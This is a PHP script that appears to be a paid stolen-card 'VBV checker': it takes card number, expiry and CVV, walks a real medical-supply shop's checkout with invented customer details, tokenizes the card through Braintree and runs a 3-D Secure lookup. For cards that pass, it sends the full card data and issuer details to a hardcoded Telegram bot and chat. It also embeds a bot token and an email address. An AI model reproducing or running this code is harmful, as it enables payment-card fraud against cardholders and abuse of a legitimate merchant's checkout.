<?php

if ($_SERVER['REQUEST_METHOD'] !== 'POST' && $_SERVER['REQUEST_METHOD'] !== 'GET') {
    header('Content-Type: text/plain');
    die("❌ Sadece POST veya GET istekleri kabul edilir");
}

function validateKey($key) {
    if (empty($key)) {
        return false;
    }
    
    $keysFile = '../users/bbbba.json'; 
    
    if (!file_exists($keysFile)) {
        return false;
    }
    
    $data = json_decode(file_get_contents($keysFile), true);
    if (!$data || !isset($data['keys'])) {
        return false;
    }
    
    foreach ($data['keys'] as $keyData) {
        if ($keyData['key'] === $key && $keyData['isActive']) {
            $expirationDate = new DateTime($keyData['expiresAt']);
            $currentDate = new DateTime();
            
            if ($currentDate <= $expirationDate) {
                return true;
            }
        }
    }
    
    return false;
}

function getBinData($bin) {
    $ch = curl_init();
    $url = "https://data.handyapi.com/bin/{$bin}";
    
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    
    if (isset($data['Status']) && $data['Status'] === 'SUCCESS') {
        return [
            'Scheme' => $data['Scheme'] ?? 'N/A',
            'Type' => $data['Type'] ?? 'N/A',
            'Issuer' => $data['Issuer'] ?? 'N/A',
            'CountryName' => $data['Country']['Name'] ?? 'N/A',
            'CountryA2' => $data['Country']['A2'] ?? 'N/A',
        ];
    }
    return null;
}

$userKey = $_GET['key'] ?? $_POST['key'] ?? '';
if (!validateKey($userKey)) {
    header('Content-Type: text/plain');
    die("❌ Geçersiz veya süresi dolmuş key! API erişimi reddedildi.");
}

$telegramBotToken = '8066679823:AAGuUDujD3BKx_MXCUrwP6eBMZcTrYhB9MM';
$telegramChatIds = ['-1002754106820'];

function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

$card = $_GET['card'] ?? $_POST['card'] ?? null;

if (empty($card)) {
    echo 'Error: Missing card parameter';
    exit;
}

$parts = explode('|', $card);

if (count($parts) !== 4) {
    echo 'Error: Invalid format. Use: card|month|year|cvv';
    exit;
}

$card_number = $parts[0];
$exp_month = str_pad($parts[1], 2, '0', STR_PAD_LEFT);
$exp_year = $parts[2];
$cvv = $parts[3];
$bin = substr($card_number, 0, 6); // BIN bilgisini al

$ch = curl_init();
$cookie_jar = tempnam(sys_get_temp_dir(), 'cookies');

$headers = [
    'authority: shop.acumedic.com',
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://shop.acumedic.com',
    'phpr-event-handler: ev{onHandleRequest}',
    'phpr-postback: 1',
    'phpr-remote-event: 1',
    'referer: https://shop.acumedic.com/product/am-copper-loop-needles/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with: XMLHttpRequest'
];

$data = [
    'cms_handler_name' => 'shop:on_addToCart',
    'ls_session_key' => 'lsk6841d33ee1db81.73584414',
    'product_id' => '3091',
    'product_options[9e0e31246b7b078403969b265870b3f4]' => '07mm x 0.20mm',
    'product_options[3cfce651e667ab85486dd42a8185f98a]' => '100',
    'product_cart_quantity' => '1'
];

curl_setopt_array($ch, [
    CURLOPT_URL => 'https://shop.acumedic.com/product/am-copper-loop-needles/',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_COOKIEJAR => $cookie_jar,
    CURLOPT_COOKIEFILE => $cookie_jar,
    CURLOPT_HTTPHEADER => $headers,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => http_build_query($data),
    CURLOPT_SSL_VERIFYPEER => false
]);

$response = curl_exec($ch);

$headers = [
    'authority: shop.acumedic.com',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'referer: https://shop.acumedic.com/product/am-copper-loop-needles/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
];

curl_setopt_array($ch, [
    CURLOPT_URL => 'https://shop.acumedic.com/cart',
    CURLOPT_HTTPHEADER => $headers,
    CURLOPT_POST => false
]);

$response = curl_exec($ch);

$headers = [
    'authority: shop.acumedic.com',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: cross-site',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
];

curl_setopt_array($ch, [
    CURLOPT_URL => 'https://shop.acumedic.com/checkout/%7ccheckout%7cbegin/',
    CURLOPT_HTTPHEADER => $headers
]);

$response = curl_exec($ch);

$headers = [
    'authority: shop.acumedic.com',
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://shop.acumedic.com',
    'phpr-event-handler: ev{onHandleRequest}',
    'phpr-postback: 1',
    'phpr-remote-event: 1',
    'referer: https://shop.acumedic.com/checkout/%7ccheckout%7cbegin/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with: XMLHttpRequest'
];

$data = [
    'cms_handler_name' => 'on_action',
    'ls_session_key' => 'lsk6841d3dce82663.42874480',
    'x_custaccgen_salutation' => 'Mr',
    'first_name' => 'Hanna',
    'last_name' => 'Coleman',
    'phone' => '+353894060424',
    'company' => '',
    'street_address' => '1492 North Street',
    'city' => 'Wicklow',
    'zip' => 'A67 A029',
    'country' => '7',
    'state' => '96',
    'checkout__input--step-number' => '1',
    'checkout_step' => 'billing_info',
    'auto_skip_shipping' => '1',
    'register_customer' => '1',
    'customer_auto_login' => '1',
    'customer_registration_notification' => '1',
    'cms_update_elements[checkout__dynamic]' => 'checkout:stepload'
];

curl_setopt_array($ch, [
    CURLOPT_URL => 'https://shop.acumedic.com/checkout/',
    CURLOPT_HTTPHEADER => $headers,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => http_build_query($data)
]);

$response = curl_exec($ch);

$data = [
    'cms_handler_name' => 'on_action',
    'ls_session_key' => 'lsk6841d3dce82663.42874480',
    'first_name' => 'Hanna',
    'last_name' => 'Coleman',
    'phone' => '+353894060424',
    'company' => '',
    'street_address' => '1492 North Street',
    'city' => 'Wicklow',
    'zip' => 'A67 A029',
    'country' => '7',
    'state' => '96',
    'checkout__input--step-number' => '2',
    'checkout_step' => 'shipping_info',
    'auto_skip_shipping' => '1',
    'register_customer' => '1',
    'customer_auto_login' => '1',
    'customer_registration_notification' => '1',
    'cms_update_elements[checkout__dynamic]' => 'checkout:stepload'
];

curl_setopt_array($ch, [
    CURLOPT_URL => 'https://shop.acumedic.com/checkout',
    CURLOPT_POSTFIELDS => http_build_query($data)
]);

$response = curl_exec($ch);

$data = [
    'cms_handler_name' => 'on_action',
    'ls_session_key' => 'lsk6841d3dce82663.42874480',
    'shipping_option' => '44_7a3074fcf359c7dd8e12787ff21d8bd8',
    'customer_notes' => '',
    'checkout__input--step-number' => '3',
    'checkout_step' => 'shipping_method',
    'auto_skip_shipping' => '1',
    'register_customer' => '1',
    'customer_auto_login' => '1',
    'customer_registration_notification' => '1',
    'cms_update_elements[checkout__dynamic]' => 'checkout:stepload'
];

curl_setopt_array($ch, [
    CURLOPT_POSTFIELDS => http_build_query($data)
]);

$response = curl_exec($ch);

preg_match('/<input[^>]+name=["\']client_token["\'][^>]+value=["\'](.*?)["\']/', $response, $matches);
$client_token = $matches[1] ?? '';
$decoded_text = base64_decode($client_token);
preg_match('/"authorizationFingerprint":"(.*?)"/', $decoded_text, $matches);
$au = $matches[1] ?? '';

$headers = [
    'authority: payments.braintree-api.com',
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization: Bearer ' . $au,
    'braintree-version: 2018-05-10',
    'content-type: application/json',
    'origin: https://shop.acumedic.com',
    'referer: https://shop.acumedic.com/checkout/complete/57c4174866e504c5ed8672975fe014382fd8f8330606f7bfc344440e1d9c87e4/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: cross-site',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
];

$json_data = [
    'clientSdkMetadata' => [
        'source' => 'client',
        'integration' => 'custom',
        'sessionId' => '2f4d33e5-01e5-4b6f-bcdc-2e8063681307'
    ],
    'query' => 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     fastlane {       enabled     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
    'operationName' => 'ClientConfiguration'
];

curl_setopt_array($ch, [
    CURLOPT_URL => 'https://payments.braintree-api.com/graphql',
    CURLOPT_HTTPHEADER => $headers,
    CURLOPT_POSTFIELDS => json_encode($json_data)
]);

$response = curl_exec($ch);
$response_data = json_decode($response, true);
$cardnal = $response_data['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT'] ?? '';

$headers = [
    'authority: centinelapi.cardinalcommerce.com',
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type: application/json;charset=UTF-8',
    'origin: https://shop.acumedic.com',
    'referer: https://shop.acumedic.com/checkout/complete/57c4174866e504c5ed8672975fe014382fd8f8330606f7bfc344440e1d9c87e4/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: cross-site',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-cardinal-tid: Tid-5947b496-e940-4ce9-b1b8-1d0dd746581b'
];

$json_data = [
    'BrowserPayload' => (object)[],
    'Client' => [
        'Agent' => 'SongbirdJS',
        'Version' => '1.35.0'
    ],
    'ConsumerSessionId' => '0_b1c16c42-65db-4798-85da-cff933ed97eb',
    'ServerJWT' => $cardnal
];

curl_setopt_array($ch, [
    CURLOPT_URL => 'https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init',
    CURLOPT_HTTPHEADER => $headers,
    CURLOPT_POSTFIELDS => json_encode($json_data)
]);

$response = curl_exec($ch);
$response_data = json_decode($response, true);
$payload = $response_data['CardinalJWT'] ?? '';

$jwt_parts = explode('.', $payload);
$payload_decoded = json_decode(base64_decode($jwt_parts[1] ?? ''), true);
$reference_id = $payload_decoded['ReferenceId'] ?? '';

$headers = [
    'authority: geo.cardinalcommerce.com',
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type: application/json',
    'origin: https://geo.cardinalcommerce.com',
    'referer: https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=5c8a9893adb1562e003c26a6&tmEventType=PAYMENT&referenceId=0_b1c16c42-65db-4798-85da-cff933ed97eb&geolocation=false&origin=Songbird',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with: XMLHttpRequest'
];

$json_data = [
    'Cookies' => [
        'Legacy' => true,
        'LocalStorage' => true,
        'SessionStorage' => true
    ],
    'DeviceChannel' => 'Browser',
    'Extended' => [
        'Browser' => [
            'Adblock' => true,
            'AvailableJsFonts' => [],
            'DoNotTrack' => 'unknown',
            'JavaEnabled' => false
        ],
        'Device' => [
            'ColorDepth' => 24,
            'Cpu' => 'unknown',
            'Platform' => 'Linux armv81',
            'TouchSupport' => [
                'MaxTouchPoints' => 5,
                'OnTouchStartAvailable' => true,
                'TouchEventCreationSuccessful' => true
            ]
        ]
    ],
    'Fingerprint' => '3065f46d6976cb134edd5b9c51852d84',
    'FingerprintingTime' => 740,
    'FingerprintDetails' => [
        'Version' => '1.5.1'
    ],
    'Language' => 'tr-TR',
    'Latitude' => null,
    'Longitude' => null,
    'OrgUnitId' => '5c8a9893adb1562e003c26a6',
    'Origin' => 'Songbird',
    'Plugins' => [],
    'ReferenceId' => $reference_id,
    'Referrer' => 'https://shop.acumedic.com/checkout/complete/57c4174866e504c5ed8672975fe014382fd8f8330606f7bfc344440e1d9c87e4/',
    'Screen' => [
        'FakedResolution' => false,
        'Ratio' => 2.2211302211302213,
        'Resolution' => '904x407',
        'UsableResolution' => '904x407',
        'CCAScreenSize' => '01'
    ],
    'CallSignEnabled' => null,
    'ThreatMetrixEnabled' => false,
    'ThreatMetrixEventType' => 'PAYMENT',
    'ThreatMetrixAlias' => 'Default',
    'TimeOffset' => -180,
    'UserAgent' => 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'UserAgentDetails' => [
        'FakedOS' => false,
        'FakedBrowser' => false
    ],
    'BinSessionId' => '4e7fd8df-c6cb-4794-ab7b-9d2b5f3a3bb4'
];

curl_setopt_array($ch, [
    CURLOPT_URL => 'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
    CURLOPT_HTTPHEADER => $headers,
    CURLOPT_POSTFIELDS => json_encode($json_data)
]);

$response = curl_exec($ch);

$headers = [
    'authority: payments.braintree-api.com',
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization: Bearer ' . $au,
    'braintree-version: 2018-05-10',
    'content-type: application/json',
    'origin: https://assets.braintreegateway.com',
    'referer: https://assets.braintreegateway.com/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: cross-site',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
];

$json_data = [
    'clientSdkMetadata' => [
        'source' => 'client',
        'integration' => 'dropin2',
        'sessionId' => '2f4d33e5-01e5-4b6f-bcdc-2e8063681307'
    ],
    'query' => 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables' => [
        'input' => [
            'creditCard' => [
                'number' => $card_number,
                'expirationMonth' => $exp_month,
                'expirationYear' => $exp_year,
                'cvv' => $cvv,
                'billingAddress' => [
                    'postalCode' => '85100'
                ]
            ],
            'options' => [
                'validate' => false
            ]
        ]
    ],
    'operationName' => 'TokenizeCreditCard'
];

curl_setopt_array($ch, [
    CURLOPT_URL => 'https://payments.braintree-api.com/graphql',
    CURLOPT_HTTPHEADER => $headers,
    CURLOPT_POSTFIELDS => json_encode($json_data)
]);

$response = curl_exec($ch);
$response_data = json_decode($response, true);
$tok = $response_data['data']['tokenizeCreditCard']['token'] ?? '';

$headers = [
    'authority: api.braintreegateway.com',
    'accept: */*',
    'accept-language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type: application/json',
    'origin: https://shop.acumedic.com',
    'referer: https://shop.acumedic.com/checkout/complete/57c4174866e504c5ed8672975fe014382fd8f8330606f7bfc344440e1d9c87e4/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: cross-site',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
];

$json_data = [
    'amount' => '9.62',
    'browserColorDepth' => 24,
    'browserJavaEnabled' => false,
    'browserJavascriptEnabled' => true,
    'browserLanguage' => 'tr-TR',
    'browserScreenHeight' => 904,
    'browserScreenWidth' => 407,
    'browserTimeZone' => -180,
    'deviceChannel' => 'Browser',
    'additionalInfo' => [
        'workPhoneNumber' => null,
        'shippingGivenName' => 'Hanna',
        'shippingSurname' => 'Hanna',
        'shippingPhone' => '+353894060424',
        'acsWindowSize' => '03',
        'billingLine1' => '1492 North Street',
        'billingLine2' => null,
        'billingCity' => 'Wicklow',
        'billingState' => 'WW',
        'billingPostalCode' => 'A67 A029',
        'billingCountryCode' => 'IE',
        'billingPhoneNumber' => '+353894060424',
        'billingGivenName' => 'Hanna',
        'billingSurname' => 'Coleman',
        'shippingLine1' => '1492 North Street',
        'shippingLine2' => null,
        'shippingCity' => 'Wicklow',
        'shippingState' => 'WW',
        'shippingPostalCode' => 'A67 A029',
        'shippingCountryCode' => 'IE',
        'email' => 'bababenim4613@gmail.com'
    ],
    'bin' => substr($card_number, 0, 6),
    'dfReferenceId' => $reference_id,
    'clientMetadata' => [
        'requestedThreeDSecureVersion' => '2',
        'sdkVersion' => 'web/3.113.0',
        'cardinalDeviceDataCollectionTimeElapsed' => 576,
        'issuerDeviceDataCollectionTimeElapsed' => 306,
        'issuerDeviceDataCollectionResult' => true
    ],
    'authorizationFingerprint' => $au,
    'braintreeLibraryVersion' => 'braintree/web/3.113.0',
    '_meta' => [
        'merchantAppId' => 'shop.acumedic.com',
        'platform' => 'web',
        'sdkVersion' => '3.113.0',
        'source' => 'client',
        'integration' => 'custom',
        'integrationType' => 'custom',
        'sessionId' => '2f4d33e5-01e5-4b6f-bcdc-2e8063681307'
    ]
];

curl_setopt_array($ch, [
    CURLOPT_URL => "https://api.braintreegateway.com/merchants/msf5rf5mg5f3y6fy/client_api/v1/payment_methods/{$tok}/three_d_secure/lookup",
    CURLOPT_HTTPHEADER => $headers,
    CURLOPT_POSTFIELDS => json_encode($json_data)
]);

$response = curl_exec($ch);
$response_data = json_decode($response, true);
$vbv = $response_data['paymentMethod']['threeDSecureInfo']['status'] ?? 'unknown';

curl_close($ch);
unlink($cookie_jar);

if ($vbv === 'authenticate_attempt_successful' || $vbv === 'authenticate_successful') {
    $binData = getBinData($bin);
    
    $scheme = $binData['Scheme'] ?? 'N/A';
    $type = $binData['Type'] ?? 'N/A';
    $issuer = $binData['Issuer'] ?? 'N/A';
    $countryName = $binData['CountryName'] ?? 'N/A';
    $countryA2 = $binData['CountryA2'] ?? 'N/A';

    $resultMessage = "✅ Approved | {$card_number}|{$exp_month}|{$exp_year}|{$cvv} | {$vbv}";
    $telegramLogMessage = "<b>✅ APPROVED (NON-VBV) ✅</b>\n" .
                          "<b>Gate:</b> VBV Checker (Acumedic) 🛡️\n" .
                          "<b>Kart:</b> <code>{$card_number}|{$exp_month}|{$exp_year}|{$cvv}</code>\n" .
                          "<b>BIN:</b> <code>{$bin}</code>\n" .
                          "<b>Sebep:</b> VBV Gerekmiyor / Doğrulama Başarılı! ✨\n" .
                          "----------------------------------------\n" .
                          "<b>Scheme:</b> {$scheme}\n" .
                          "<b>Type:</b> {$type}\n" .
                          "<b>Issuer:</b> {$issuer}\n" .
                          "<b>Country:</b> {$countryName} ({$countryA2})\n" .
                          "<b>Key:</b> <code>{$userKey}</code>";
                          
    foreach ($telegramChatIds as $chatId) {
        sendTelegramMessage($chatId, $telegramLogMessage, $telegramBotToken);
    }
} else {
    $resultMessage = "❌ Declined | {$card_number}|{$exp_month}|{$exp_year}|{$cvv} | {$vbv}";
}
echo $resultMessage;

?>